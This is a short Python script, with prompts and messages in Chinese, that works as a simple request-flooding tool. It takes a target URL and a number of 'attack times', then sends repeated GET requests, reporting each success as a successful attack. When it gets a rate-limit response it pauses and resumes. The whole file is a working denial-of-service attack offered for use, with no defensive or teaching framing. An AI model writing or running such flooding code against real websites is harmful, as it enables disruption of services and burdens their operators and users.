import random, string
import webbrowser
import time
import requests
import os

url = input("Url Here(With https or http):")
times = input("Attack Times:")
for i in range(int(times)):

    r = requests.get(url)
    if r.status_code == 200:
        print(f"{r.status_code}:攻擊成功 第{i+1}次攻擊")
    elif r.status_code == 429:
        print(r.status_code," 請求過多，將於600秒後重試")
        time.sleep(600)
    else:
        print("404 未知的連結")            
input("點擊Enter退出程式")
